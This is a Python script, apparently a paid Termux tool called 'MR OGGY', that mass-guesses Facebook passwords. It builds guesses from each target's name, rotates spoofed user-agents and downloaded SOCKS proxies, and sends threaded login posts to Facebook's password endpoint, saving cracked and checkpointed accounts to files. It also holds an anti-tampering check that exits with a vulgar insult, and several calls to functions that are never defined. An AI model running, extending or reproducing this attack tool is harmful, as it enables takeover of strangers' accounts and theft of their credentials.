#--------------------------#-------------------#
import os 
import requests,bs4,json,os,sys,random,datetime,time,re,uuid
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from time import localtime as lt
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 12; Lenovo TB-X606FA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6353.215 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/532438891;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; SM-G780G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/435.0.0.32.108;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/537314828;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBDV/SM-G780G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/pt_PT;FBBV/548243055;FBCR/Unitel STP;FBMF/samsung;FBBD/samsung;FBDV/SM-A032F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1459};FB_FW/1;]",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/bg_BG;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G770F;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2163};FB_FW/1;]",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;]",]
ua = ["Mozilla/5.0 (Linux; Android 14; Lenovo TB-X505X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6294.226 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6269.196 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6300.195 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 13; H96 Max RK3318) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6268.206 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Tab8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6270.220 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 13; MRX-AL09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6306.216 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6328.212 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6263.195 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 12; SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; arm_64; Android 12; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.10.1 YaSearchBrowser/23.10.1 BroPP/1.0 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 12; RMX3393) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaApp_Android/22.93.1 YaSearchBrowser/22.93.1 BroPP/1.0 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 12; 21061119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.10.1 YaSearchBrowser/23.10.1 BroPP/1.0 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; TECNO LG6n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",]

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mOGGY')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'



def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]

def back():
	login()
	
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
S = '\033[1;37m';A = '\x1b[38;5;208m';R = '\x1b[38;5;46m';F = '\x1b[38;5;48m';Z = '\033[1;33m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';h = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';W = '\x1b[38;5;196m';hh = '\033[34;1m'
#━━━━━━━━[SECURITY-CODE ]━━━━━━━━#
wak='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(wak+'sessions.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
fu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(fu+'models.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
su='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(su+'utils.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
hu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(hu+'api.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
nu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(nu+'auth.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
dhon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(dhon+'packages.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')

pwpluss,pwnya=[],[]
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DEVEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+f'{G1}|'+str(bln)+f'{G1}|'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def jahidj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
os.system('clear')
import os, platform, time, sys
import os,random,sys,time 
from os import system as _loading_  
def loading(): 
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"] 
    for i in range(50): 
        time.sleep(0.1) 
        sys.stdout.write(f"\r\033[1;37m>\033[1;36m>  \033[1;37mLOADING... " + animation[i % len(animation)] +"\x1b[0m ") 
        sys.stdout.flush() 
time.sleep(2)
sys.stdout.write('\x1b]2;MR OGGY\x07')
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-GB) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#------------------[ MAIN ]-----------------#
def banner():
	os.system("clear")
	print (f"""
\033[1;37m>\033[1;36m>\x1b[38;5;46m  db   db  .d88b.  .d8888. d888888b  \x1b[38;5;46mN
\033[1;37m>\033[1;36m>\033[1;37m  88   88 .8P  Y8. 88'  YP `~~88~~'  \033[1;31mO
\033[1;37m>\033[1;36m>\x1b[38;5;46m  88ooo88 88    88 `8bo.      88     \033[1;33mY
\033[1;37m>\033[1;36m>\033[1;37m  88~~~88 88    88   `Y8b.    88     \x1b[38;5;122mO
\033[1;37m>\033[1;36m>\x1b[38;5;46m  88   88 `8b  d8' db   8D    88     \033[34;1mN
\033[1;37m>\033[1;36m>\033[1;37m  YP   YP  `Y88P'  `8888Y'    YP   \x1b[38;5;46mMR OGGY
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m>\033[1;36m>  \033[1;37mCREATE    \033[1;37m: \033[1;37mMR OGGY
\033[1;37m>\033[1;36m>  \033[1;37mFECBOOK   \033[1;37m: \033[1;37mNOYON
\033[1;37m>\033[1;36m>  \033[1;37mGITHUB    \033[1;37m: \033[1;37mNOYON
\033[1;37m>\033[1;36m>  \033[1;37mSTATAS    \033[1;37m: \033[1;37m1\033[1;36m.\033[1;37m8
\033[1;37m>\033[1;36m>  \033[1;37mVERTION   \033[1;37m: \033[1;31mPAID
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
	os.system('clear')
	print(banner)
	
def login():
	banner()
	loading()
	os.system('clear')
	banner()
	print(f"\033[1;37m<1\033[1;36m> \033[1;37mFILE CLONEING  ")
	print(f"\033[1;37m<2\033[1;36m> \033[1;37mOLD CLONEING ")
	print(f"\033[1;37m<3\033[1;36m> \033[1;37mRANDOM CLONEING")
	print(f"\033[1;37m<4\033[1;36m> \033[1;37mJOINT MY GROUP  ")
	print(f"\033[1;37m<5\033[1;36m> \033[1;37mEXIT  ")
	linex()
	OGGY= input('\033[1;37m>\033[1;36m>  \033[1;37mCHOOSE: ');time.sleep(0.01)
	if OGGY in ['m']:
		public()
	elif OGGY in ['1']:
		crack_file()
	elif OGGY in ['2','02']:
		_old_()
	elif OGGY in ['4','0৳']:
		os.system('xdg-open https://wa.me/+01860568307')
	elif OGGY in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('#DONE LOGOUT ')
		exit()
	else:
		print('# SELECT CORRECTLY ')
		back()
def error():
	print(f'{k}#TRY AGAIN {u}')
	time.sleep(4)
	back()
		
def crack_file():
	os.system('clear')
	banner()
	print('\033[1;37m>\033[1;36m>  \033[1;37mPUT FILE EXAMPLE \x1b[38;5;196m: /\x1b[38;5;46msdcard\x1b[38;5;196m/\x1b[38;5;46mfile\x1b[38;5;196m.\x1b[38;5;46mtxt')
	o = input('\033[1;37m>\033[1;36m>  \033[1;37mINPUT FILE NAME \x1b[38;5;196m~>\033[33;1m')
	linex()
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\033[1;37m<=\033[1;36m> \033[1;37mUPDATE ACTIVE 🚀\n\033[1;37m<1\033[1;36m> \x1b[38;5;46mFIRE METHOD\n\033[1;37m<=\033[1;36m> \033[1;37mACTIVE FILE FIRE 🔥')
	linex()
	hc = input('\033[1;37m>\033[1;36m>  \033[1;37mCHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['1','02']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	banner()
	print(f'\033[1;37m>\033[1;36m> \033[1;37m\x1b[38;5;46mTOTAL ACCOUNT\x1b[38;5;196m »----➤\033[1;37m '+str(len(id)))
	print(f'\033[1;37m>\033[1;36m> \033[1;37m\x1b[38;5;46mIF YOU NO RESULT \033[1;92mON\x1b[38;5;46m/\x1b[38;5;196mOFF \x1b[38;0;34m\x1b[38;5;46mAIRPLANE MODE')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@1234')
					pwv.append(frs+'017')
					pwv.append(frs+'018')
					pwv.append(frs+'019')
					pwv.append(frs+'123456')
					pwv.append(frs+'112233')
					pwv.append(frs+'12345')
					pwv.append(frs)
					pwv.append('i love you')
					pwv.append(frs+'@12')
					pwv.append(frs+'00')
					pwv.append(frs+'@1234')
					pwv.append('57575752')
					pwv.append(nmf)
					pwv.append('57273200')
					pwv.append('59039200')
					pwv.append('57575751')
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append('free fire')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')					
					pwv.append(frs+'#@')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@1234')
					pwv.append(frs+'017')
					pwv.append(frs+'018')
					pwv.append(frs+'019')
					pwv.append(frs+'123456')
					pwv.append(frs+'112233')
					pwv.append(frs+'12345')
					pwv.append(frs)
					pwv.append('i love you')
					pwv.append(frs+'@12')
					pwv.append(frs+'00')
					pwv.append(frs+'@1234')
					pwv.append('57575752')
					pwv.append(nmf)
					pwv.append('free fire')
					pwv.append('57273200')
					pwv.append('59039200')
					pwv.append('57575751')
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')					
					pwv.append(frs+'#@')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					
					
					
				pool.submit(crack,idf,pwv)
	print('')
	OGGYj('==========================================')
	OGGYj('CLONING COMPLETE .......... ')
	print(f'{h}[{h}💚{h}]{h} Your Total OK idz : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r\r\r\033[1;37m>\033[1;36m> \033[1;37m\033[1;37m[\x1b[38;5;46mKING-NOYON\033[1;37m] \033[1;37m>\033[1;36m> \033[1;37m[\x1b[38;5;46m{loop}\033[1;37m]\033[1;37m>\033[1;36m> \033[1;37m[{h}{len(id)}{P}]\033[1;37m>\033[1;36m> \033[1;37m[{h}OK{P}•\x1b[38;5;46m{ok}{P}]")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;31m[OGGY-CP] '+idf+' | '+pw)
			   ## open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\033[1;31m[{G1}OGGY-OK\033[1;31m]{G1} {idf} | {pw}')
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#━━━━━━━━[ OLD-CODE ]━━━━━━━━#


if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch prox.txt')
	except:pass

login()
#aa()